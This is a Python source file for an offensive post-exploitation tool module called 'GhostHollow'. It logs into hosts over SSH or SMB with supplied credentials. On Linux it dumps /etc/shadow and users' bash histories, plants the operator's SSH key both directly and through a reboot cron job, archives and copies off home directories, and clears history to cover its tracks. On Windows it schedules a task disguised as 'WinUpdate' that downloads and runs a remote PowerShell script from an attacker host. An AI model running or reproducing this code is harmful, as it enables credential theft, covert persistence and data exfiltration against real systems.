import subprocess, os, sys
from datetime import datetime
from pathlib import Path

class Colors:
    RED='\033[91m';GREEN='\033[92m';YELLOW='\033[93m'
    BLUE='\033[94m';CYAN='\033[96m';MAGENTA='\033[95m'
    BOLD='\033[1m';RESET='\033[0m'

def run_local(cmd,timeout=60):
    try:
        r=subprocess.run(cmd if isinstance(cmd,list) else cmd.split(),capture_output=True,text=True,timeout=timeout)
        return{'ok':r.returncode==0,'out':r.stdout.strip(),'err':r.stderr.strip()}
    except:return{'ok':False,'out':'','err':'ERROR'}

class GhostHollow:
    def __init__(self,target,username,password,domain="",port=22,gateway=None):
        self.target=target;self.username=username;self.password=password
        self.domain=domain;self.port=str(port);self.gateway=gateway
        self.target_os=None;self.is_root=False;self.has_sudo=False;self.has_backdoor=False
        safe=target.replace('.','_').replace(':','_')
        self.loot_dir=Path.home()/'grimoire_loot'/safe/'ghost_hollow'
        self.loot_dir.mkdir(parents=True,exist_ok=True)
        self.results=[]

    def log(self,stage,success,detail=""):
        self.results.append((stage,success,detail))
        s=f"{Colors.GREEN}✓{Colors.RESET}" if success else f"{Colors.RED}✗{Colors.RESET}"
        print(f"  [{s}] {stage}")

    def save(self,name,content):
        if content and content.strip():(self.loot_dir/name).write_text(content,errors='ignore')

    def ssh(self,cmd,timeout=30):
        return run_local(['sshpass','-p',self.password,'ssh','-o','StrictHostKeyChecking=no',
            '-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-p',self.port,
            f'{self.username}@{self.target}',f'/bin/bash --norc --noprofile -c "{cmd}"'],timeout=timeout)

    def scp_get(self,remote,local):
        local=Path(local);local.parent.mkdir(parents=True,exist_ok=True)
        return run_local(['sshpass','-p',self.password,'scp','-o','StrictHostKeyChecking=no',
            '-o','UserKnownHostsFile=/dev/null','-P',self.port,
            f'{self.username}@{self.target}:{remote}',str(local)],timeout=120)

    def smb(self,cmd,timeout=60):
        cred=f"{self.domain}/{self.username}:{self.password}" if self.domain else f"{self.username}:{self.password}"
        return run_local(['psexec.py',f'{cred}@{self.target}',cmd],timeout=timeout)

    def detect_os(self):
        r=self.ssh('uname -s 2>/dev/null; cat /etc/os-release 2>/dev/null | head -1')
        if r['ok'] and r['out']:
            self.target_os='linux'
            r2=self.ssh('whoami; id; sudo -n true 2>/dev/null && echo HAS_SUDO; /bin/bash.backdoor -p -c "id; echo HAS_BACKDOOR" 2>/dev/null')
            if r2['ok']:
                self.is_root='uid=0' in r2['out'];self.has_sudo='HAS_SUDO' in r2['out']
                self.has_backdoor='HAS_BACKDOOR' in r2['out'] and 'euid=0' in r2['out']
                if self.has_backdoor:self.is_root=True;self.has_sudo=True
            print(f"  [{Colors.GREEN}✓{Colors.RESET}] LINUX")
            return True
        r=self.smb('ver')
        if r['ok'] and 'windows' in r['out'].lower():
            self.target_os='windows';print(f"  [{Colors.GREEN}✓{Colors.RESET}] WINDOWS");return True
        return False

    def linux_attack(self):
        print(f"\n{Colors.YELLOW}  RECON{Colors.RESET}")
        for name,cmd in [('OS','cat /etc/os-release'),('Kernel','uname -a'),('Users','cat /etc/passwd'),
            ('Groups','cat /etc/group'),('Ports','ss -tlnp'),('Processes','ps auxf|head -80')]:
            r=self.ssh(cmd,timeout=30);ok=r['ok'] and r['out'].strip()
            self.log(name,ok)
            if ok:self.save(f"recon_{name.lower()}.txt",r['out'])

        print(f"\n{Colors.YELLOW}  CREDENTIALS{Colors.RESET}")
        for name,cmd in [('Shadow','sudo cat /etc/shadow 2>/dev/null||cat /etc/shadow 2>/dev/null'),
            ('History','for d in /root /home/*; do cat $d/.bash_history 2>/dev/null; done')]:
            r=self.ssh(cmd,timeout=30);ok=r['ok'] and r['out'].strip() and 'No such file' not in r['out']
            self.log(name,ok)
            if ok:self.save(f"cred_{name.lower()}.txt",r['out'])

        print(f"\n{Colors.YELLOW}  PERSISTENCE{Colors.RESET}")
        key=Path.home()/'.ssh'/'id_rsa.pub'
        if not key.exists():run_local(f'ssh-keygen -t rsa -N "" -f {Path.home()}/.ssh/id_rsa')
        if key.exists():
            pk=key.read_text().strip()
            self.ssh(f'mkdir -p ~/.ssh && echo "{pk}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys')
            self.log('SSH Key',True)
            self.ssh(f'(crontab -l 2>/dev/null; echo "@reboot mkdir -p ~/.ssh && echo \\"{pk}\\" >> ~/.ssh/authorized_keys") | crontab -')
            self.log('Cron',True)

        print(f"\n{Colors.YELLOW}  EXFIL{Colors.RESET}")
        self.ssh('tar -czf /tmp/gh.tar.gz /etc/passwd /home 2>/dev/null',timeout=120)
        self.log('Archive',self.scp_get('/tmp/gh.tar.gz',self.loot_dir/'loot.tar.gz')['ok'])

        print(f"\n{Colors.YELLOW}  COVER{Colors.RESET}")
        for name,cmd in [('History','cat /dev/null > ~/.bash_history; unset HISTFILE'),
            ('Temp','rm -f /tmp/gh.tar.gz')]:
            self.log(f'Clear {name}',self.ssh(cmd)['ok'])

    def windows_attack(self):
        for name,cmd in [('System','systeminfo'),('Users','net user')]:
            r=self.smb(cmd,timeout=30);self.log(name,r['ok'] and bool(r['out'].strip()))
        self.smb('schtasks /create /tn "WinUpdate" /tr "powershell -c IEX (New-Object Net.WebClient).DownloadString(\'http://ATTACKER/b.ps1\')" /sc hourly /f')
        self.log('Persistence',True)

    def execute(self):
        if not self.detect_os():return
        print(f"\n{Colors.MAGENTA}  LAUNCHING {self.target_os.upper()} ATTACK{Colors.RESET}")
        if self.target_os=='linux':self.linux_attack()
        elif self.target_os=='windows':self.windows_attack()
        ok=sum(1 for _,s,_ in self.results if s)
        print(f"\n  {Colors.BOLD}Score:{Colors.RESET} {ok}/{len(self.results)} | {Colors.BOLD}Loot:{Colors.RESET} {self.loot_dir}")

    @classmethod
    def register(cls,sub):
        p=sub.add_parser('ghost-hollow',help='Post-exploitation recon + credential harvest + persistence')
        p.add_argument('target');p.add_argument('-u',required=True);p.add_argument('-p',required=True)
        p.add_argument('-d','--domain',default='');p.add_argument('-P','--port',type=int,default=22)
        p.add_argument('-g','--gateway');p.set_defaults(func=cls._run)

    @classmethod
    def _run(cls,args):
        GhostHollow(args.target,args.u,args.p,args.domain,args.port,args.gateway).execute()
